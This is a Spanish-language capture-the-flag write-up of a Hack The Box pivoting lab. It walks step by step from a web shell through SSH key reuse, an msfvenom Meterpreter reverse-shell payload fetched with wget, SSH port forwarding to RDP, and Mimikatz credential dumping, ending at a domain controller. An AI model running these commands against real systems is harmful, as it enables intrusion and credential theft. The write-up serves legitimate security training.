--- 
title: "Laboratorio Pivoting - Evaluación de Habilidades"  
date: 2025-06-30
tags: [#Pivoting #WebShell #Metasploit #SSH #RDP #Mimikatz]
categories: ["HTB", "Pivoting" ]
summary: " En este write-up se detalla el proceso de explotación y pivoting dentro de la red interna de Inlanefreight usando un acceso inicial por una web shell. Se muestra cómo se enumeran servicios, se obtienen credenciales, se establece conexión SSH con llave privada, se ejecutan cargas útiles con Metasploit para crear sesiones Meterpreter y se avanza pivotando a través de diferentes hosts hasta llegar al controlador de dominio. Finalmente, se emplea Mimikatz para extraer credenciales y se accede a la bandera ubicada en el servidor objetivo, demostrando un enfoque práctico de post-explotación y movimiento lateral en entornos Windows y Linux."
draft: false 

---
#### Enunciado
Un miembro del equipo inició una prueba de penetración en el entorno de Inlanefreight, pero fue transferido a otro proyecto en el último momento. Afortunadamente, nos dejaron una `web shell`prueba para que podamos volver a conectarnos a la red y retomar el trabajo donde ellos lo dejaron. Necesitamos aprovechar el shell web para seguir enumerando los hosts, identificando servicios comunes y usando esos servicios/protocolos para integrarnos en las redes internas de Inlanefreight. Nuestros objetivos son:
- Comience desde afuera y acceda al primer sistema a través del shell web que quedó en su lugar.
- Utilice el acceso al shell web para enumerar y pivotar a un host interno.
- Continúe enumerando y pivotando hasta llegar al `Inlanefreight Domain Controller`y capture el asociado `flag`.
- Utilice cualquier `data`, `credentials`, `scripts`, u otra información dentro del entorno para habilitar sus intentos de pivoteo.
- Coge `any/all`las banderas que puedas encontrar.

**Información de conexión**
`Foothold`:
`IP`:10.129.229.129 (ACADEMIA-PIVOT-WEB01)
Encontrará el shell web que se muestra a continuación cuando navegue a support.inlanefreight.local o la IP de destino indicada anteriormente.

**Una vez en el servidor web, enumere el host para obtener las credenciales que se pueden usar para iniciar un pivote o túnel a otro host de la red. ¿En el directorio de qué usuario se encuentran las credenciales? Envíe el nombre del usuario como respuesta.**

Iniciamos la enumeración de servicios para identificar los puertos y protocolos activos en la máquina objetivo. 
```bash
nmap -sS -p- --min-rate 2000 -n -Pn <IP>
```

![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/nmap1.png)
Vemos que tenemos los puertos 22 y 80 abiertos, accedemos por el puerto 80 a la webshell que nos habían comentado en el enunciado del ejercicio.

En caso de querer entrar con el nombre `support.inlanefreight.local` debemos asociar este nombre con la `IP` que nos den en HTB, para que resuelva correctamente.

```bash
nano /etc/hosts

<IP>     support.inlanefreight.local
```

Cuando acedemos a la web vemos que efectivamente tenemos capacidad de ejecutar comandos en el servidor.

![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/web1.png)

![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/web2.png)
Vemos por acá los ususarios `root`, `webadmin`, `administrator`. 

**Envíe las credenciales que se encuentran en el directorio de inicio del usuario. (Formato: usuario: contraseña)**

Revisando en los directorios que tenemos acceso vemos lo siguiente:
![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/web3.png)
Nos dan por acá un usuario y una contraseña `mlefay:Plain Human work!`

**Enumere la red interna y descubra otro host activo. Envíe la dirección IP de ese host como respuesta.**

Seguimos buscando y vemos una clave `id_rsa`, nos la copiamos a local. 
![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/web4.png)

Luego que nos copiamos `id_rsa` le asignamos los permisos correctos 
```bash
chmod 600 id_rsa
```
Y la utilizamos para entrar al servidor por ssh como usuario `webadmin`, directorio del usuario donde se encontraba la llave. 

```bash
ssh webadmin@<IP> -i id_rsa
```

![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/ssh1.png)

Seguimos mirando en el servidor y vemos esto:
```bash
ifconfig
```
![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/ssh2.png)
Nosotros tenemos conexión al servidor por la interfaz `ens160` dado que estamos en la misma subred, con lo cual el objetivo de este módulo es poder pivotar a la red interna en este caso `172.16.0.0` por la interfaz `en192`.

**Hacemos una carga útil para el pivote desde nuestra máquina**

```shell-session
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP_atacante> -f elf -o backupjob LPORT=8080
```

Vamos a tener un archivo `backupjob` el cual vamos a trasferir a nuestro pivote.
En nuestra máquina atacante, en el directorio donde se encuentra el archivo `backupjob`:
```bash
python3 -m http.server 8088
```
En el pivote:
```bash
wget http://<IP_Atacante>:8088/backupjob
```
Luego le damos permisos
```bash
chmod +x backupjob
```

**Configuración e inicio del receptor en metasploit**

```bash
msf6 > use exploit/multi/handler

> set lhost 0.0.0.0
> set lport 8080
> set payload linux/x64/meterpreter/reverse_tcp
> run
```

**Ejecución de la carga útil en el Pivote**
 
```bash
chmod +x backupjob 
./backupjob
```

![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/ssh3.png)


4.  **Enumeramos la subred interna:**
```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/24
```

![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/ssh4.png)

De los cuales nos vamos a quedar con `172.16.5.35`

Pivotamos sobre el host que nos dan para llegar al recién descubierto en la subred interna digamos, donde vamos a ejecutar un redireccionamiento desde nuestro host por el puerto 9050 hacia el destino por el puerto 3389 para ver si tenemos `RDP`.

```bash
ssh -L 9050:<IP_interna>:3389 webadmin@<IP_pivote> -i id_rsa
```

![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/piv1.png)

Y nos conectamos por `RDP` mediante el redireccionamiento que hicimos anteriormente, por  el puerto 9050 y con las credenciales que obtuvimos previamente también.

```bash
xfreerdp3 /v:127.0.0.1:9050 /u:mlefay /p:'Plain Human work!'
```

Nos movemos hacia la ruta que nos ponen en `HTB`:

![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/piv2.png)

**En pruebas de penetración anteriores contra Inlanefreight, hemos observado que tienen la mala costumbre de utilizar cuentas con servicios de forma que expone las credenciales de los usuarios y la red en su conjunto. ¿Qué usuario es vulnerable?**

Llegado a este punto debemos apoyarnos de la herramienta `mimikatz` para ver si hay algún usuario en el sistema que podamos obtener sus credenciales.

Copiamos la herramienta a la máquina objetivo `172.16.5.35` 
Dejo el enlace por acá:
- https://github.com/ParrotSec/mimikatz

Abrimos la herramienta desde la `Powershell`

![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/piv3.png)
Ejecutamos los comandos siguientes para obtener los passwords guardados en memoria y lo exportamos al archivo hashes.txt.

```powershell
privilege::debug
log hashes.txt
sekurlsa::logonpasswords
```

![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/piv4.png)

Y tenemos credenciales de otro usuario del servidor `vfrank:Imply wet Unmasked!`

**Para el siguiente salto, enumere las redes y utilice una solución de acceso remoto común para la migración. Envíe el archivo C:\Flag.txt ubicado en la estación de trabajo.**

Para esto debemos ver que redes tenemos accedo desde está máquina.

```cmd
ipconfig
```

![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/piv5.png)

Abrimos la powershell y hacemos ping:

```bash
$ping = New-Object System.Net.Networkinformation.Ping ; 1..254 | % { $ping.send("172.16.6.$_", 1) | where status -ne 'TimedOut' | select Address | fl * }
```

![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/piv6.png)
Y vemos las ips `172.16.6.25` y `172.16.6.45`

![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/piv7.png)
Ejecutamos el acceso remoto a la ip 172.16.6.25 con las credenciales de `vfrank`

![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/piv8.png)

**Envíe el contenido de C:\Flag.txt ubicado en el controlador de dominio.**

![](../../../../../images/HTB_modulos/pivoting_htb_labs_1/piv9.png)



Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.

